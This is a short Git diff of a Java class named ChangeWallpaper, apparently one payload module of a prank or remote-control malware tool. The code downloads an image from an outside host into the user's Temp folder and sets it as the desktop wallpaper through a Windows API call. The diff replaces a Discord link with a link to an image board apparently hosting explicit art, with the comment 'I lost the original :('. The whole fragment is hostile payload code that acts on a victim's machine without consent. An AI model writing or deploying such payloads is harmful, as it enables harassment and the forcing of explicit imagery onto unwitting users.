@@ -23,7 +23,7 @@ public class ChangeWallpaper implements PayloadExecutor {
     public void execute() throws Exception {
         File path = new File(System.getProperty("user.home") + "\\AppData\\Local\\Temp\\joaoshiozomoment.png");
 
-        fileUtil.downloadFile("https://cdn.discordapp.com/attachments/983042411506847785/1020436119755702404/furry.png", path);
+        fileUtil.downloadFile("https://static1.e621.net/data/sample/da/23/da2360f727b60c11a6c50a9647065e31.jpg", path); //I lost the original :(
 
         SPI.INSTANCE.SystemParametersInfo(
                 new UINT_PTR(SPI.SPI_SETDESKWALLPAPER),
